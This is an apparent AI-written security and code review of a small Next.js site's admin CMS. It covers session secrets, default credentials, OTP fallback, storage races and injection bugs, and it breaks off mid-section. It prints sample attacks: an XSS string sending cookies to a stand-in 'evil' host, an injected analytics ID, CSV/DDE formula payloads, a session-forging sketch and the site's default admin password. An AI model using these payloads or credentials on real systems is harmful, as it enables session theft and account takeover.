# Yantrix Technology — Full Project Code Review

**Repository:** `akashshinde700/yantrix`
**Reviewed commit:** `e4e5200` — *Admin OTP login; door nameplate, responsive layout and auto-open*
**Date:** 30 Oct 2026
**Scope:** entire repository (235 files, **210 in the review set**)

**Methodology — [alibaba/open-code-review](https://github.com/alibaba/open-code-review) (`ocr` v1.13.3), delegation mode**

```bash
ocr scan --preview --format json           # deterministic file selection → 210 files
ocr delegate rule --format json <files>    # template-engine rule resolution → 4 rule groups
```

OCR supplied the engineering half (file selection, exclusion reasons, per-language review rules);
the actual review was performed by the host agent against those rules. Rule groups applied:

| Group | Pattern | Files |
|---|---|---|
| 1 | `default` (shell, SQL, config, mjs…) | 16 |
| 2 | `**/*.{json,json5}` | 2 |
| 3 | `**/*.{ts,js,tsx,jsx,mjs,cjs}` | 191 |
| 4 | `**/package.json` | 1 |

Excluded by OCR: 13 unsupported extensions, 11 binaries, 1 default path (`package-lock.json`).

**Static evidence gathered**

| Check | Result |
|---|---|
| `npx tsc --noEmit` | ❌ **2 errors** |
| `npx eslint .` | ❌ **3 errors**, 1 warning |
| `npx next build` | ❌ fails (2 font errors) + 1 tracing warning |
| `dangerouslySetInnerHTML` | 5 sites audited |
| `eval` / `new Function` / `innerHTML` / `document.write` | ✅ none |
| `var` declarations | ✅ none |
| Loose `==` / `!=` | ✅ none (1 legitimate `!= null`) |
| `: any` | 1 (`scroll-animations.tsx:90`) |
| `console.log` in `src/` | ✅ none |
| Astray `TODO` / `FIXME` / `@ts-ignore` | ✅ none |
| Static asset references | ✅ **12/12 resolve** |
| `addEventListener` / `removeEventListener` pairing | ✅ 20/20 balanced |

---

## Verdict

This is a **well above average** codebase for a small-business marketing site with an admin CMS.
Comments explain *why* rather than *what*, the layering (content store facade → MySQL/JSON backends)
is clean, and error paths are mostly thought through.

The problems cluster in three places:

1. **Security defaults that are safe in a sandbox and dangerous in production** (§1).
2. **Read-modify-write on whole documents with no locking** — the admin store and the JSON store both lose writes under concurrency (§2).
3. **Build hygiene is switched off** rather than maintained (§5).

Nothing found is an exploit-in-30-seconds bug. But items **1.1, 1.2 and 1.3 together** form a
chain that fully compromises the admin panel on a default deployment, so treat them as one fix.

---

## Summary table

| # | Severity | Area | Finding |
|---|---|---|---|
| 1.1 | 🔴 Critical | Auth | Hardcoded fallback session secret |
| 1.2 | 🔴 Critical | Auth | Default admin credentials auto-seeded |
| 1.3 | 🟠 High | Auth | 2FA silently disabled when SMTP is unset |
| 1.4 | 🟠 High | Auth | Session survives password change / deactivation |
| 1.5 | 🟡 Medium | Auth | Brute-force guard is per-process and trusts `x-forwarded-for` |
| 2.1 | 🟠 High | Store | Backend choice is module-scoped; content cache is process-scoped |
| 2.2 | 🟠 High | Store | Full-list read-modify-write of `admins` (no lock/transaction) |
| 2.3 | 🟡 Medium | Store | `ensureDefaultAdmin()` race can delete the account just created |
| 2.4 | 🟡 Medium | Store | Content read-modify-write loses concurrent edits |
| 2.5 | 🟡 Medium | Store | In-flight read can re-cache stale content after a write |
| 2.6 | 🟡 Medium | Store | JSON store swallows parse errors → silent data reset |
| 2.7 | 🟡 Medium | Store | JSON `addEnquiry` read-modify-write race |
| 3.1 | 🟠 High | XSS | JSON-LD injected with `JSON.stringify` without `<` escaping |
| 3.2 | 🟡 Medium | XSS | GA / Clarity IDs interpolated raw into script bodies |
| 3.3 | 🟡 Medium | Export | CSV formula injection in enquiry export |
| 3.4 | 🟡 Medium | Infra | `Caddyfile` proxies to any localhost port via `?XTransformPort=` |
| 4.1 | 🟡 Medium | Data | `sanitiseItem` silently drops non-scalar fields |
| 4.2 | 🟢 Low | Admin | Dead authorisation condition on enquiry list |
| 4.3 | 🟢 Low | Admin | No role gating in the admin UI |
| 4.4 | 🟢 Low | Admin | Main DB error path returns generic 500 with no trace |
| 5.1 | 🟡 Medium | Build | `ignoreBuildErrors: true` + `reactStrictMode: false` |
| 5.2 | 🟡 Medium | Build | Dynamic `fs.readFile` traces the entire project into standalone output |
| 5.3 | 🟡 Medium | Build | `examples/websocket` imports undeclared deps → `tsc` fails |
| 5.4 | 🟢 Low | Build | 36 MB of `.mp4` tracked despite `*.mp4` in `.gitignore` |
| 5.5 | 🟢 Low | Build | Fonts fetched from Google at build time |
| 5.6 | 🟢 Low | Build | `db/schema.sql` out of sync with runtime schema |
| 6.1 | 🟢 Low | React | 3 × `setState` synchronously in effect |
| 6.2 | 🟢 Low | React | `TextScramble` interval not cleaned up |
| 6.3 | 🟢 Low | React | Template leftovers: `api/route.ts`, package name |
| 6.4 | 🟡 Medium | Dead code | **5,085 lines (19% of `src/`) in 17 unreferenced effect components** |

---

## 1. Authentication & session security

The OTP design itself is genuinely good: `crypto.randomInt` codes, only an HMAC of the code is stored,
single-use, 5-minute TTL, 5 attempt cap, 30-second resend cooldown, 3 resend cap, `timingSafeEqual`
comparison, and the challenge cookie is `httpOnly` + `SameSite=Strict`. Nothing to fix there.
The problems are all around the edges.

### 1.1 🔴 Critical — Hardcoded fallback session secret

`src/lib/admin/auth.ts:23-25`

```ts
const SECRET =
  process.env.ADMIN_SESSION_SECRET ??
  "yantrix-dev-only-session-secret-change-me-in-production";
```

If `ADMIN_SESSION_SECRET` is not set, every session cookie is signed with a string that is
**published in this repository**. `.env.example` ships it commented out, and `.env*` is gitignored —
so a deployment that copies `.env.example` and only fills in `DATABASE_URL` and SMTP gets this secret.

An attacker can then mint their own session token:

```js
const body = Buffer.from(JSON.stringify({
  sub: "<any admin id>", email: "x", name: "x", role: "owner",
  exp: Date.now() + 8 * 3600 * 1000,
})).toString("base64url");
// signature = HMAC-SHA256(body, "yantrix-dev-only-session-secret-change-me-in-production")
```

`getSessionAdmin()` only re-checks that `sub` matches a **real, active** admin id — so the attacker
needs one valid id. `ensureDefaultAdmin()` uses `randomBytes(8)`, but admin ids are also returned by
`GET /api/admin/admins`… which requires a session. Still: 64 bits of id is the only barrier, and the
first part of the attack (forging `role: "owner"`) is unconditional.

**Fix** — fail closed:

```ts
const SECRET = process.env.ADMIN_SESSION_SECRET;
if (!SECRET) {
  if (process.env.NODE_ENV === "production") {
    throw new Error("ADMIN_SESSION_SECRET is required in production");
  }
}
const secret = SECRET ?? "dev-only";
```

Also: rotate the value now if this has ever been deployed without it, because any token signed with
the old secret stays valid for 8 hours.

---

### 1.2 🔴 Critical — Default admin credentials auto-seeded

`src/lib/admin/auth.ts:20-21, 54-55`

```ts
export const DEFAULT_ADMIN_EMAIL = "admin@yantrixtechnology.com";
export const DEFAULT_ADMIN_PASSWORD = "Yantrix@2024";
...
const email = (process.env.ADMIN_EMAIL ?? DEFAULT_ADMIN_EMAIL).toLowerCase();
const password = process.env.ADMIN_PASSWORD ?? DEFAULT_ADMIN_PASSWORD;
```

`ensureDefaultAdmin()` runs on **every login attempt and on every admin-list read**, and if
`getAdmins()` returns an empty list it happily creates an `owner` with the public password.

Two realistic failure modes make this worse than it looks:

- **The JSON fallback re-arms it.** `store.ts` falls back to `./data` whenever MySQL is unreachable.
  On a fresh container without a database, the admin list is empty → default owner is created and
  written to `./data/admins.json`. If the container is ephemeral, that repeats on every cold start.
- **`ensureDefaultAdmin()` is called from `GET /api/admin/admins`** (`route.ts:26`), which is behind
  auth — but the login route calls it *before* verifying anything.

**Fix**

```ts
async function ensureDefaultAdmin() {
  const admins = await getAdmins();
  if (admins.length > 0) return;

  const email = process.env.ADMIN_EMAIL;
  const password = process.env.ADMIN_PASSWORD;
  if (!email || !password) {
    if (process.env.NODE_ENV === "production") {
      throw new Error("No admin exists. Set ADMIN_EMAIL and ADMIN_PASSWORD to bootstrap.");
    }
    // dev only: fall back to the documented default
  }
  ...
  // and force a password change on first login
}
```

Log a loud one-line warning whenever the default is used, and add a `mustChangePassword` flag to
`AdminAccount` so the seeded account cannot be used for anything until it is rotated.

---

### 1.3 🟠 High — 2FA is silently disabled when SMTP is unset

`src/lib/mail/otp-email.ts:25-30`

```ts
if (!mailConfigured()) {
  console.warn(`... [admin OTP] SMTP not configured — code for ... is ${code} ...`);
  return { ok: true };
}
```

```ts
export function otpDeliveryMethod(): OtpDelivery {
  return mailConfigured() ? "email" : "console";
}
```

When SMTP is not configured the one-time code is:

1. printed to the server terminal (persisted in `server.log` via the `start` script's `tee`),
2. reported to the browser as `delivery: "console"`,
3. and the login completes.

So the second factor degrades to "whoever can read container logs". Anyone with the password — the
thing 2FA exists to compensate for — gets in. The UI even tells the user this in
`login-form.tsx:250`: *"Email isn't configured yet — the code was printed in the server terminal."*

The console fallback is genuinely useful for local development. It just must not exist in production.

**Fix**

```ts
export function otpDeliveryMethod(): OtpDelivery {
  if (mailConfigured()) return "email";
  if (process.env.NODE_ENV === "production") return "unavailable";
  return "console";
}
```

…and have `deliverOtp()` return `{ ok: false }` when the method is `"unavailable"`, so
`/api/admin/login` responds 502 instead of issuing a challenge nobody can complete. Note the login
route already handles `!sent.ok` correctly — it just never gets the chance to run.

Related: the OTP printout uses a hand-aligned box and `padEnd(44)`; emails longer than 44 characters
break the frame. Cosmetic, but `console.warn` with a plain line would be sturdier.

---

### 1.4 🟠 High — Sessions survive password change and account deactivation

`src/lib/admin/auth.ts:96-124`

The session payload carries `sub`, `email`, `name`, `role`, `exp` — everything except any binding to
the credential that was actually proved.

`getSessionAdmin()` re-reads the admin and checks `a.id === payload.sub && a.active`, which correctly
covers **deletion** and **deactivation**. It does **not** cover:

- **Password change.** `PATCH /api/admin/admins/[id]` rewrites `passwordHash`, but every outstanding
  session for that account keeps working for the remaining TTL (up to 8 hours). If a laptop is stolen
  and the owner changes their password, the thief's browser stays logged in.
- **Role change.** `role` is baked into the token at issue time. `getSessionAdmin()` returns the
  *live* admin record, so `canWrite()` uses the current role — that part is fine — but a UI that
  cached `admin.role` from the sign-in response will be stale until refresh.
- **Sign-out elsewhere.** `POST /api/admin/logout` only clears the caller's cookie.

**Fix** — add a monotonically increasing `sessionVersion: number` to `AdminAccount` (default 0),
embed it in the token, and reject the token when `admin.sessionVersion !== payload.ver`. Bump it in
`PATCH /api/admin/admins/[id]` whenever `passwordHash` or `active` changes, and add a
"Sign out everywhere" action that bumps it unconditionally.

Also worth shortening `SESSION_TTL_MS` from 8 hours, or adding rolling re-issue.

---

### 1.5 🟡 Medium — Brute-force guard is per-process and trusts `x-forwarded-for` blindly

`src/lib/admin/login-guard.ts:15-17`

```ts
export function clientIp(request: NextRequest): string {
  return request.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
      ?? request.headers.get("x-real-ip") ?? "unknown";
}
```

Two issues:

- **The header is taken at face value.** Behind the bundled `Caddyfile` this happens to be safe
  (`header_up X-Forwarded-For {remote_host}` *replaces* the header, it does not append), but the
  Next.js app itself has no way to know that. Deploy it behind anything that appends
  (`X-Forwarded-For: attacker, real`) and the attacker controls the rate-limit key completely.
- **The map is per-process.** `globalThis.yantrixLoginFailures` is shared across route bundles in one
  Node process, but not across instances, pods, or serverless invocations. On any horizontally-scaled
  deployment the effective limit becomes `MAX_FAILURES × instances` per 10 minutes.

`src/app/api/contact/route.ts:22` has the same design and is worse: it uses a **plain module-level
`Map`**, not `globalThis`, so a dev-mode hot reload resets it, and it diverges from the pattern used
by `login-guard.ts`. Two files, two conventions, for the same problem.

**Fix** — read the *last* untrusted hop (`x-forwarded-for` rightmost non-private address), make the
hop count configurable, and move the counters to Redis or the existing MySQL instance once you have
more than one instance. Minimum viable: extract one `rateLimit(key)` helper and use it in both places.

---

## 2. Content store — concurrency and data integrity

`src/lib/content/store.ts` is a nice facade, and the `CONTENT_STORE=auto|mysql|json` mode switch
with a fail-fast TCP probe is a thoughtful touch. The correctness problems are underneath it.

### 2.1 🟠 High — Backend choice is module-scoped; the cache is process-scoped

`src/lib/content/store.ts:30`

```ts
let backend: Backend = MODE === "json" ? "json" : "mysql";   // module scoped
```

…but 100 lines below, the content cache is deliberately **global**:

```ts
// src/lib/content/store.ts:125-131
// One cache per server process, on globalThis: Next bundles API routes and
// pages as separate module instances, so a module-level cache would let an
// admin save refresh only the API's copy while pages kept serving stale content.
const shared = globalThis as unknown as { yantrixContentCache?: ... };
```

The comment gets the hazard exactly right and then applies the fix to only one of the two variables.
`backend` is the other one — and it flips **silently, per module instance**, inside `run()`:

```ts
// store.ts:98-113
async function run<T>(onMysql, onJson) {
  if (backend === "json") return onJson();
  if (!(await mysqlReachable())) { warnOnce(...); backend = "json"; return onJson(); }
  try { return await onMysql(); }
  catch (error) {
    if (MODE !== "auto" || !isUnreachable(error)) throw error;
    warnOnce(error); backend = "json"; return onJson();
  }
}
```

Concretely: at boot MySQL is briefly unreachable. The **page** bundle's copy of `store.ts` probes,
fails, and latches to JSON. The **API route** bundle probes 200 ms later, MySQL has come up, and it
stays on MySQL. From then on the site renders content from `./data/site-content.json` while every
admin save goes to MySQL. Nobody ever sees the change. The same split makes `ensureDefaultAdmin()`
seed a JSON admin that MySQL-mode login never finds.

`mysqlReachable()` compounds it — the promise is cached for the process lifetime:

```ts
// store.ts:41
reachable ??= new Promise<boolean>(...)
```

so a database that becomes reachable one second after boot is **never** used again until restart.

**Fix**

1. Move `backend` and `reachable` onto the same `shared` object as the cache. Any latch that changes
   behaviour must be process-wide or it is a split-brain bug.
2. Make the latch sticky **and** the probe re-runnable: cache only `true`, and re-probe (with a
   short backoff) when latched to JSON, so a recovered database is picked back up.
3. In production, `CONTENT_STORE=mysql` should be mandatory — `auto` should refuse to start rather
   than silently write content to a container filesystem.

---

### 2.2 🟠 High — Full-list read-modify-write of `admins`, with no lock or transaction

`src/lib/content/mysql-store.ts:364-402`

```ts
export async function saveAdmins(admins: AdminAccount[]): Promise<void> {
  const conn = await (await db()).getConnection();
  await conn.beginTransaction();
  const ids = admins.map((a) => a.id);
  if (ids.length > 0) await conn.query("DELETE FROM admins WHERE id NOT IN (?)", [ids]);
  else await conn.query("DELETE FROM admins");
  for (const a of admins) await conn.query(`INSERT ... ON DUPLICATE KEY UPDATE ...`);
  await conn.commit();
}
```

The transaction protects *this* write against partial failure, but every caller does
`read → mutate → save the whole list` outside any transaction:

| Caller | Operation |
|---|---|
| `auth.ts:159-166` `recordLogin()` | on **every successful login** |
| `api/admin/admins/route.ts:65` POST | create |
| `api/admin/admins/[id]/route.ts:60, 86` PATCH/DELETE | update / delete |
| `auth.ts:50-68` `ensureDefaultAdmin()` | seed |

Two admins signing in at the same moment, or an owner creating an account while someone else logs
in, and last-writer-wins wipes the loser's change. The nasty case: **owner creates a new admin while
another admin's `recordLogin()` is in flight** → `recordLogin`'s stale list lacks the new id →
`DELETE ... WHERE id NOT IN (...)` **deletes the account that was just created**. The owner sees
"Admin created" and then "Account not found" on the very next request.

`DELETE FROM admins WHERE id NOT IN (?)` is also a full-table delete-then-reinsert pattern; every
login rewrites every row and therefore every `password_hash`.

**Fix** — stop replacing the list. Give each operation its own statement:

```ts
// recordLogin
await conn.query("UPDATE admins SET last_login_at = ? WHERE id = ?", [new Date(), id]);

// create
await conn.query("INSERT INTO admins (...) VALUES (...)");

// patch
await conn.query("UPDATE admins SET name = ?, role = ?, active = ? WHERE id = ?", [...]);

// delete
await conn.query("DELETE FROM admins WHERE id = ?", [id]);
```

Then `saveAdmins(admins[])` is only needed by the JSON backend and can be dropped from the façade.

---

### 2.3 🟡 Medium — `ensureDefaultAdmin()` race

`src/lib/admin/auth.ts:50-68`

```ts
const admins = await getAdmins();
if (admins.length > 0) return;
... build owner with randomBytes(8) id ...
await saveAdmins([owner]);
```

It calls `getAdmins()` then `saveAdmins()` with **no re-check inside a lock**. Two concurrent first
requests (very common — the login page and the layout both trigger it) both see an empty list, both
build an owner with a **different random id**, and the second `saveAdmins([owner])` sees only its own
id in the `NOT IN` list and deletes the first one.

On MySQL the `email` column is `UNIQUE`, so the second insert hits a duplicate-key error and the
whole thing throws; the user sees a 500 on the login page. On the JSON backend there is no unique
constraint, so you get whichever write landed last.

**Fix** — make creation idempotent at the database level:

```sql
INSERT IGNORE INTO admins (id, name, email, ...) VALUES (?, ?, ?, ...);
```

or `INSERT ... ON DUPLICATE KEY UPDATE id = id`, then re-read. Belt and braces: add a
`SELECT ... FOR UPDATE` on a sentinel row, or gate seeding behind a one-shot boot task instead of
doing it lazily on the login path.

---

### 2.4 🟡 Medium — Content read-modify-write loses concurrent edits

`src/lib/content/mysql-store.ts:220-226` (and `json-store.ts:168-174`)

```ts
export async function updateContent(mutator) {
  const current = await getContent();
  const next = await mutator(structuredClone(current));
  return saveContent(next);
}
```

`/api/admin/content` handles seven operations through this path. With `site_content` being a single
row holding the entire JSON document, two admins editing different collections at the same time
means whichever save lands second overwrites the other's change entirely — silently, with both
receiving `{ ok: true, content }`.

The 30-second cache in `store.ts` widens the window: `getContent()` there may not even hit the
database.

**Fix** — optimistic concurrency. `SiteContent` already has a `version` field that is incremented on
every save; use it:

```ts
const current = await getContent();
const next = await mutator(structuredClone(current));
const result = await conn.query(
  "UPDATE site_content SET data = ?, updated_at = ?, version = version + 1 WHERE id = 1 AND version = ?",
  [JSON.stringify(next), new Date(), current.version]
);
if (result.affectedRows === 0) throw new ConflictError();
```

Return `409` and let the admin refresh. Also collapse `version` out of the JSON document into a real
column so the check is atomic.

---

### 2.5 🟡 Medium — In-flight read can re-cache stale content after a write

`src/lib/content/store.ts:138-149`

```ts
export function getContent(): Promise<SiteContent> {
  const cached = shared.yantrixContentCache;
  if (cached && Date.now() - cached.at < CONTENT_TTL_MS) return Promise.resolve(cached.value);

  shared.yantrixContentPending ??= run(mysqlStore.getContent, jsonStore.getContent)
    .then(remember)                     // ← unconditional
    .finally(() => { shared.yantrixContentPending = null; });

  return shared.yantrixContentPending;
}
```

`saveContent()` / `updateContent()` / `resetContent()` clear `yantrixContentCache`, but they do not
cancel `yantrixContentPending`. Sequence:

1. `getContent()` starts a read at t=0; MySQL returns the **old** document at t=40 ms.
2. An admin save lands at t=20 ms, clears the cache and writes the new document.
3. The read resolves at t=40 ms and `remember(old)` repopulates the cache **with stale content**.
4. Every page serves stale content for the next 30 seconds — exactly the case the cache was designed
   to avoid.

**Fix** — stamp reads with a generation counter:

```ts
const gen = shared.yantrixGeneration ??= 0;
...
.then((value) => (gen === shared.yantrixGeneration ? remember(value) : value))
```

and increment `shared.yantrixGeneration` inside every write before clearing the cache.

The dependency-free alternative: have writes `await` any pending read before clearing the cache.

---

### 2.6 🟡 Medium — JSON store swallows parse errors → silent data reset

`src/lib/content/json-store.ts:65-78`

```ts
try {
  const raw = await fs.readFile(FILES[key], "utf8");
  const parsed = JSON.parse(raw) as T;
  memoryCache.set(key, parsed);
  return parsed;
} catch {
  return (memoryCache.get(key) as T | undefined) ?? fallback;   // ← every error
}
```

The `catch` is there to cover "file does not exist yet", which is the common case on a fresh
checkout. But it also swallows:

- `SyntaxError` from a truncated or hand-edited file,
- `EACCES` from a permissions problem,
- `ENOSPC`, `EMFILE`…

and returns the **built-in defaults** as if the file were empty. Because the next write starts from
whatever was read, an admin saving one FAQ after a corrupted read persists the defaults over the
real content. No log line, no warning — the site just quietly reverts to stock copy.

**Fix** — distinguish the cases:

```ts
catch (error) {
  if ((error as NodeJS.ErrnoException).code === "ENOENT") return fallback;
  console.error(`[store] ${FILES[key]} is unreadable:`, error);
  throw error;   // or: read from a .bak and repair
}
```

Pair it with the atomic write you already do (tmp file + `rename`) — add a `copyFile` to `.bak`
before the rename and you get free recovery.

---

### 2.7 🟡 Medium — JSON `addEnquiry` read-modify-write race

`src/lib/json-store.ts:188-211`

```ts
const list = await readJson<Enquiry[]>("enquiries", []);
list.unshift(enquiry);
await writeJson("enquiries", list);
```

`writeJson` serialises *writes* per file via `writeQueue`, but the read happens outside that queue.
Two contact-form submissions arriving together both read the same list, both prepend, and the second
write drops the first enquiry. The visitor still gets `201 Created` and a confirmation email, so the
lead is lost with no trace anywhere.

`getEnquiries()` on line 185 has a smaller variant of the same issue: `list.sort(...)` mutates the
array held in `memoryCache`, so the in-memory copy silently reorders.

**Fix** — move the read inside the queue:

```ts
async function mutateJson<T>(key: FileKey, fallback: T, fn: (current: T) => T): Promise<T> {
  let result!: T;
  const next = enqueue(key, async () => {
    const current = await readJsonUncached(key, fallback);
    result = fn(current);
    await writeFileAtomic(FILES[key], result);
  });
  await next;
  return result;
}
```

(MySQL mode is already correct here — a plain `INSERT`.)

---

## 3. Injection surfaces

### 3.1 🟠 High — JSON-LD injected with `JSON.stringify` and no `<` escaping

`src/components/site/site-page.tsx:34` and `src/components/site/legal-page.tsx:47`

```tsx
<script
  type="application/ld+json"
  dangerouslySetInnerHTML={{ __html: JSON.stringify(schema) }}
/>
```

`JSON.stringify` does **not** escape `<`, `>` or `/`. The HTML parser terminates a `<script>` element
on the literal byte sequence `</script`, regardless of the `type` attribute — so any string field
that reaches `buildJsonLd()` can break out of the element:

```
admin sets organisation name to:  Yantrix</script><script>fetch('//evil?'+document.cookie)</script>
```

Fields that flow into the graph and are all admin-editable (`src/lib/seo.ts:114+`):
`settings.name`, `settings.shortName`, `settings.positioning`, `settings.tagline`,
`settings.contact.*`, `global.areaServed`, `global.languages`, `course.title`,
`course.description`, `course.highlights[]`, and the whole FAQ list.

Severity is *medium-high* rather than critical because it requires a valid admin session — but note
that the `editor` role can write `seo` and `pages` via `updateSeo`/`updatePages`, and an editor can
also change `settings` through `updateSettings`, so a **low-privilege** account reaches it. On the
public site this is a persistent XSS that fires for every visitor, including other admins.

**Fix** — one helper, used everywhere:

```ts
// src/lib/seo.ts
export function serializeJsonLd(value: unknown): string {
  return JSON.stringify(value)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}
```

```tsx
dangerouslySetInnerHTML={{ __html: serializeJsonLd(schema) }}
```

The `\u2028`/`\u2029` replacements matter too — they are valid in JSON but are line terminators in
JavaScript, so they break older engines.

---

### 3.2 🟡 Medium — GA / Clarity IDs interpolated raw into script bodies

`src/app/layout.tsx:159-167` and `174-179`

```tsx
src={`https://www.googletagmanager.com/gtag/js?id=${gaMeasurementId}`}
...
<Script id="ga4-init">
  {`window.dataLayer = window.dataLayer || [];
gtag('config', '${gaMeasurementId}');`}
</Script>
```

`gaMeasurementId` and `clarityId` come straight from `content.seo.global`, editable by any `editor`
— the same privilege level as a blog author. A value like

```
G-XXXX';fetch('//evil?'+document.cookie);//
```

turns into executable code on every page. `next/script` children are rendered as raw text.

The template-literal `src` is a milder second problem: an unvalidated value in an external script
URL lets an editor point the page at an arbitrary host.

**Fix** — validate both fields at the schema boundary instead of trusting them:

```ts
const GA_ID = /^G-[A-Z0-9]{4,20}$/;
const CLARITY_ID = /^[a-z0-9]{6,20}$/;
const ga = GA_ID.test(gaMeasurementId) ? gaMeasurementId : "";
```

Add the same regexes to the `/admin/seo` form (`src/app/admin/(panel)/seo/page.tsx:116`) so bad
values are rejected at entry rather than silently dropped at render.

---

### 3.3 🟡 Medium — CSV formula injection in the enquiry export

`src/components/admin/enquiry-table.tsx:104-107`

```ts
const csv = rows
  .map((row) => row.map((cell) => `"${String(cell).replace(/"/g, '""')}"`).join(","))
  .join("\n");
```

Quoting and doubling `"` is correct **CSV** escaping, but it does not neutralise **spreadsheet
formulas**. Excel and Sheets strip the surrounding quotes on import and evaluate a cell beginning
with `=`, `+`, `-`, `@`, tab or CR:

| Enquiry `name` submitted | Becomes, in Excel |
|---|---|
| `=HYPERLINK("http://evil","Click to view offer")` | a clickable phishing link |
| `=cmd\|' /c calc'!A0` | DDE command execution (older Excel, with prompts) |
| `@SUM(1+1)*cmd\|' /c calc'!A0` | variant |

`name`, `message` and `course` are all fully attacker-controlled through the public
`POST /api/contact` (`name` allows up to 80 characters — enough). The owner exports the CSV, opens it
in Excel, and gets a malicious formula. This is a well-documented class (OWASP: *CSV Injection*).

**Fix** — prefix dangerous cells with a single quote before quoting:

```ts
const FORMULA_START = /^[=+\-@\t\r]/;
const cell = String(value);
const safe = FORMULA_START.test(cell) ? `'${cell}` : cell;
return `"${safe.replace(/"/g, '""')}"`;
```

Also: `link.click()` at line 112 is called without appending the anchor to the document. It works in
Chrome/Firefox but not in some Safari versions — `document.body.appendChild(link)` before `.click()`
and `.remove()` after is the portable form. And `URL.revokeObjectURL(url)` immediately after `click()`
can race the download in Firefox; `setTimeout(() => URL.revokeObjectURL(url), 0)` is safer.

---

### 3.4 🟡 Medium — `Caddyfile` proxies to any localhost port

`Caddyfile`

```
@transform_port_query {
    query XTransformPort=*
}
handle @transform_port_query {
    reverse_proxy localhost:{query.XTransformPort}
}
```

Any request — `https://site/?XTransformPort=3306` — is reverse-proxied to that port on localhost. If
this file ships to a real host this is an unauthenticated local-host proxy: internal services
(MySQL on 3306, the Node inspector, admin-only ports) become reachable through the public origin, and
the host becomes a port scanner. If it is preview-sandbox scaffolding only, move it out of the
deployed configuration and document that.

**Fix** — allowlist:

```
@transform_port_query {
    query XTransformPort=3000
}
```

…or drop the block for production.

---

## 4. Admin panel logic

### 4.1 🟡 Medium — `sanitiseItem` silently drops non-scalar fields

`src/app/api/admin/content/route.ts:37-51`

```ts
for (const [key, value] of Object.entries(source)) {
  if (typeof value === "string" || typeof value === "number" || typeof value === "boolean") {
    item[key] = value;                                     // scalars: kept
  } else if (Array.isArray(value)) {
    item[key] = value.map((entry) => (typeof entry === "string" ? entry : String(entry)));
  }                                                         // objects: dropped entirely
}
```

This is a whitelist by *type*, not by *key*. Consequences:

- A nested object field is **silently deleted** on save. Nothing today has one, but the moment
  someone adds `stats: [{ label, value }]` to `heroSlides`, every save wipes it, and the admin sees
  "Item updated" with a green toast.
- An array of objects becomes `["[object Object]", …]` — the same corruption, visible and permanent.
- `null` values are dropped. That is probably intended, but nothing says so.

Currently safe because `CollectionMap` items only carry scalars plus `string[]` (`modes`, `points`) —
verified against `src/lib/content/types.ts:335-362`. It is a trap waiting for the next field.

**Fix** — validate against a per-collection schema (you already have `AdminField[]` per collection in
`src/components/admin/collection-fields.ts`), or recurse:

```ts
function sanitise(value: unknown, depth = 0): unknown {
  if (depth > 4) return undefined;
  if (Array.isArray(value)) return value.map((v) => sanitise(v, depth + 1)).filter((v) => v !== undefined);
  if (isObject(value)) {
    const out: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(value)) {
      if (k === "id") continue;
      const clean = sanitise(v, depth + 1);
      if (clean !== undefined) out[k] = clean;
    }
    return out;
  }
  return typeof value === "string" || typeof value === "number" || typeof value === "boolean"
    ? value
    : undefined;
}
```

At minimum, log when a field is dropped.

---

### 4.2 🟢 Low — Dead authorisation condition on the enquiry list

`src/app/api/admin/enquiries/route.ts:12`

```ts
if (!canWrite(admin.role) && admin.role !== "viewer") { ... 403 ... }
```

`AdminRole = "owner" | "editor" | "viewer"` (`types.ts:396`). If `canWrite` is false, the role can
only be `"viewer"`, so the second clause is always false and the branch is unreachable. It reads like
an inventory of roles rather than an access rule, which makes the *actual* policy — "every signed-in
admin may read enquiries" — invisible. Compare `enquiries/[id]/route.ts`, which correctly uses
`!canWrite(...)` for writes.

**Fix** — state the policy:

```ts
// owner, editor and viewer may all read enquiries; only owner/editor may change them
```

and delete the condition, or replace it with `if (!admin)` plus a comment.

---

### 4.3 🟢 Low — No role gating in the admin UI

`src/components/admin/admin-shell.tsx:138` renders `{admin.role}` but the navigation and the
collection editors do not use it. A `viewer` sees "Add new", "Delete", "Hide from website" and the
editors' Save buttons; every one of them fails with `403 Read-only access.` from the API. The data is
safe — the API is the authority and enforces it consistently (`canWrite` on content, media, enquiries;
`isOwner` on admin management) — but it is a confusing experience.

**Fix** — read the role once in `AdminShell` and expose it through a small context; disable or hide
mutating controls for `viewer`. Bonus: hide "Admins" from the nav for non-owners.

---

### 4.4 🟢 Low — Database failures are indistinguishable from validation failures

`src/app/api/admin/content/route.ts:188-191`

```ts
} catch (error) {
  console.error("[/api/admin/content]", error);
  return NextResponse.json({ ok: false, error: "Could not save changes." }, { status: 500 });
}
```

This is correct and safe — no stack leak to the client. The gap is on the operations side: a
`ER_LOCK_WAIT_TIMEOUT`, an `ENOSPC` and an `ER_DUP_ENTRY` all become the same opaque 500. Combined
with the silent JSON fallback in `store.ts`, a production database problem can look like an
intermittent UI bug for a long time.

**Fix** — include a short correlation id in the response and the log, e.g.
`{ error: "Could not save changes.", ref }`. It costs nothing and turns "it doesn't work sometimes"
into a one-line log lookup.

---

## 5. Build, dependencies and repository hygiene

### 5.1 🟡 Medium — `ignoreBuildErrors: true` and `reactStrictMode: false`

`next.config.ts:5-8`

```ts
typescript: { ignoreBuildErrors: true },
reactStrictMode: false,
```

`ignoreBuildErrors` is why `examples/websocket/*` can reference `socket.io` and `socket.io-client` —
packages that are **not in `package.json`** — and the build still succeeds. It means type errors can
never break the deployment, so the types in this codebase are advisory rather than enforced. Given how
carefully the `SiteContent` model is built, that is a lot of design value being thrown away.

`reactStrictMode: false` disables React's double-invocation of effects, which is precisely the check
that catches missing cleanup functions (see §6.2). It also hides effects that are not idempotent.

**Fix**

```ts
typescript: { ignoreBuildErrors: false },
reactStrictMode: true,
```

…then either delete `examples/websocket/` (it is dead scaffolding — nothing imports it, `mini-services/`
is empty) or add the socket.io packages as devDependencies. Delete is better: it removes two
`tsc` errors, the only reason `ignoreBuildErrors` exists.

### 5.2 🟡 Medium — Dynamic `fs.readFile` traces the whole project into standalone output

Verified against a real build:

```
./src/lib/content/json-store.ts:71:23
Warning: Dynamic filesystem access causes tracing of the whole project
  71 |     const raw = await fs.readFile(FILES[key], "utf8");
Static analysis determined that this filesystem access causes the whole project to be traced
and included in the output. … leads to all source files (including the public folder) to be
deployed as part of the server code.
```

`FILES[key]` is a computed lookup, so Next.js cannot statically scope the read and falls back to
